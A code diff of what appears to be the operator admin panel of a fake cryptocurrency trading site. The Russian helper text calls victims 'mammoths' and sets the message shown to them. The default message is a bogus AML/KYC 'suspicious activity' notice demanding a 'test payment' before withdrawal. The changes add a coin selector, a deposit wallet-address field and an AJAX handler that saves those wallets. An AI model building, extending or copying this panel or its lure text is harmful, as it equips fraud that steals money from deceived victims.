@@ -182,7 +182,7 @@ $user_info = get_user_info($auth_token);
 
 
 
-                                <div style="display: flex; gap: 50px;  align-items: center;">
+                                <div class="errors_block" style="display: flex; gap: 50px;  align-items: center;">
                                     <div style="max-width: 450px">
                                         <h3 style="margin-bottom: 20px">
                                             Trading error
@@ -199,7 +199,7 @@ $user_info = get_user_info($auth_token);
                                         <p class="inpt_helper" style="margin-bottom: 10px">
                                             Текст, который отобразится мамонтам на странице верификации (если оставить пустым, то отобразится дефолтный текст)
                                         </p>
-                                        <textarea style="resize: none; height: 150px;  width: 450px" name="verif_error" placeholder="Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal." class="main_input"></textarea>
+                                        <textarea style="resize: none; height: 150px;  max-width: 450px; width: 100%" name="verif_error" placeholder="Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal." class="main_input"></textarea>
                                     </div>
 
                                 </div>
@@ -280,42 +280,25 @@ $user_info = get_user_info($auth_token);
                                 <div class="border_purple"></div>
 
                             </div>
+
+
                             <div class="content_inputs">
 
-                                <p class="inpt_helper">Напишите сумму в долларах которая автоматически будет конвертирован для всех валют по отдельности на странице "Deposit".</p>
+                                <p class="inpt_helper">Выберите монету, и укажите кошелек</p>
                                 <div class="input_hint">
                                     <div>Select Coin</div>
                                     <select name="coin" class="main_input">
-                                        <option>
-                                            Bitcoin
-                                        </option>
-                                        <option>
-                                            Litecoin
-                                        </option>
+                                        <?=render_list_coins()?>
                                     </select>
                                     <div><svg xmlns="http://www.w3.org/2000/svg" width="12" height="7" viewBox="0 0 12 7" fill="none">
                                             <path d="M5.46967 6.53033C5.76256 6.82322 6.23744 6.82322 6.53033 6.53033L11.3033 1.75736C11.5962 1.46447 11.5962 0.989593 11.3033 0.696699C11.0104 0.403806 10.5355 0.403806 10.2426 0.696699L6 4.93934L1.75736 0.696699C1.46447 0.403806 0.989593 0.403806 0.696699 0.696699C0.403806 0.989593 0.403806 1.46447 0.696699 1.75736L5.46967 6.53033ZM5.25 5V6H6.75V5H5.25Z" fill="white" fill-opacity="0.7"/>
                                         </svg></div>
 
                                 </div>
-                                <div class="input_hint">
-                                    <div>Select Coin</div>
-                                    <select name="network" class="main_input">
-                                        <option>
-                                            Bitcoin
-                                        </option>
-                                        <option>
-                                            Litecoin
-                                        </option>
-                                    </select>
-                                    <div><svg xmlns="http://www.w3.org/2000/svg" width="12" height="7" viewBox="0 0 12 7" fill="none">
-                                            <path d="M5.46967 6.53033C5.76256 6.82322 6.23744 6.82322 6.53033 6.53033L11.3033 1.75736C11.5962 1.46447 11.5962 0.989593 11.3033 0.696699C11.0104 0.403806 10.5355 0.403806 10.2426 0.696699L6 4.93934L1.75736 0.696699C1.46447 0.403806 0.989593 0.403806 0.696699 0.696699C0.403806 0.989593 0.403806 1.46447 0.696699 1.75736L5.46967 6.53033ZM5.25 5V6H6.75V5H5.25Z" fill="white" fill-opacity="0.7"/>
-                                        </svg></div>
 
-                                </div>
                                 <div class="input_hint">
                                     <div>Address</div>
-                                    <input type="text"  name="1week" placeholder="Enter a new address" value="sdsdssssssssssss23e23e4awqsdadadadasda">
+                                    <input type="text"  name="address" placeholder="Enter a new address" >
 
 
                                 </div>
@@ -371,6 +354,37 @@ $user_info = get_user_info($auth_token);
         });
     });
 
+    const changeWalletsDeposit_binding_form = document.getElementById("changeWalletsDeposit_binding_form");
+    changeWalletsDeposit_binding_form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new FormData(changeWalletsDeposit_binding_form);
+        $.ajax({
+            url: "/api/ajax/set_wallet_address.php",
+            type: "POST",
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+                if (data.status === "success") {
+                    new Notify({
+                        title: "Success",
+                        text: "Wallet address successfully changed",
+                        status: "success",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                } else {
+                    new Notify({
+                        title: "Error",
+                        text: "Wallet address not changed",
+                        status: "error",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                }
+            }
+        });
+    });
     const paymentAddress_binding_form = document.getElementById("paymentAddress_binding_form");
     paymentAddress_binding_form.addEventListener("submit", function(e) {
         e.preventDefault();
